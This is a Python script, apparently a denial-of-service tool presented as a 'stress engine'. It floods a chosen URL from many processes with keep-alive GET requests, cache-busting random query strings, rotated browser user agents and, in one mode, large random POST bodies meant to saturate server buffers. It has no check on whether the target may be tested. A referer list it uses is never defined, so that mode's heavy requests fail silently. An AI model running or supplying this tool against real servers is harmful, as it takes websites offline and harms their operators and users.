import sys
import multiprocessing
import time
import random
import string
import socket
import ssl

# Monster Stres Engine V4 (Turbo Multi-Processing Edition)
# Usage: python3 stress_engine.py <URL> <THREADS> <DURATION> <PORT> <MODE>

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36"
]

def get_random_string(length=8):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err):
    # Process-Local Pre-computation
    try:
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        host = parsed.netloc
        path = parsed.path if parsed.path else "/"
        scheme = parsed.scheme
    except:
        host = target_url
        path = "/"
        scheme = "http"

    if port == '80' and scheme == 'https': target_port = 443
    elif port: target_port = int(port)
    else: target_port = 443 if scheme == 'https' else 80

    common_headers = (
        f"Host: {host}\r\n"
        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
    )

    RANDOM_POOL = [get_random_string(8) for _ in range(500)]

    while time.time() < end_time:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4) 
            
            if scheme == 'https' or target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            
            s.connect((host, target_port))
            
            while time.time() < end_time:
                curr_path = path
                method = "GET"
                post_data = ""
                
                if mode == '3' or mode == '4':
                    rnd = RANDOM_POOL[random.randint(0, 499)]
                    sep = '&' if '?' in curr_path else '?'
                    curr_path = f"{path}{sep}t={rnd}"
                
                if mode == '4' and random.random() > 0.4: # 60% chance for heavy POST
                    method = "POST"
                    # Very large random body to saturate server input buffers
                    post_data = get_random_string(random.randint(5000, 50000)) 
                    headers_local = common_headers + f"Referer: {random.choice(REFERERS)}\r\n"
                    payload_str = f"{method} {curr_path} HTTP/1.1\r\n{headers_local}"
                    payload_str += f"Content-Length: {len(post_data)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{post_data}"
                else:
                    payload_str = f"{method} {curr_path} HTTP/1.1\r\n{common_headers}\r\n"

                payload = payload_str.encode('utf-8')
                s.sendall(payload)
                
                # Update Shared Stats (Locked for safety)
                with shared_req.get_lock(): shared_req.value += 1
                with shared_bytes.get_lock(): shared_bytes.value += len(payload)
                
        except:
            with shared_err.get_lock(): shared_err.value += 1
        finally:
            if s: 
                try: s.close()
                except: pass

def main():
    if len(sys.argv) < 6:
        print("Usage: python3 stress_engine.py <URL> <THREADS> <DURATION> <PORT> <MODE>")
        sys.exit(1)

    url, th_count, duration, port, mode = sys.argv[1:6]
    th_count, duration = int(th_count), int(duration)

    if not url.startswith('http'): url = 'http://' + url

    # SHARED MEMORY FOR STATS
    shared_req = multiprocessing.Value('i', 0)
    shared_bytes = multiprocessing.Value('L', 0)
    shared_err = multiprocessing.Value('i', 0)

    print(f"[*] DEPLOYING {th_count} SYSTEM PROCESSES...")
    sys.stdout.flush()

    end_time = time.time() + duration
    processes = []

    for _ in range(th_count):
        p = multiprocessing.Process(target=attack_proc, args=(url, end_time, port, mode, shared_req, shared_bytes, shared_err))
        p.daemon = True
        p.start()
        processes.append(p)

    # Monitor
    start_time = time.time()
    last_bytes = 0
    while time.time() < end_time:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        
        curr_bytes = shared_bytes.value
        mbps = ((curr_bytes - last_bytes) * 8) / (1024 * 1024)
        last_bytes = curr_bytes
        
        print(f"PROGRESS:{elapsed}:{duration} | REQ: {shared_req.value} | SPEED: {mbps:.2f} Mbps | ERRORS: {shared_err.value}")
        sys.stdout.flush()

    for p in processes: p.terminate()
    print("-" * 40 + "\n[*] MISSION COMPLETE.")

if __name__ == "__main__":
    main()
